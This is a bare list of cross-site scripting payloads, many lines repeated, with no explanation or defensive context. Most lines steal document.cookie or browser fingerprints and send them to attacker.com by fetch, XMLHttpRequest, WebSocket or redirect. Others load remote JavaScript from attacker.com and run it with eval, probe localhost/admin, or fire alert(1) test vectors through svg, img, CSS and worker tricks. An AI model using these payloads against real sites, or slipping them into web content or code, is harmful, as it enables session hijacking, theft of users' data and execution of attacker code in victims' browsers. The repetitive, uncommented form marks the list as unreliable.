<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
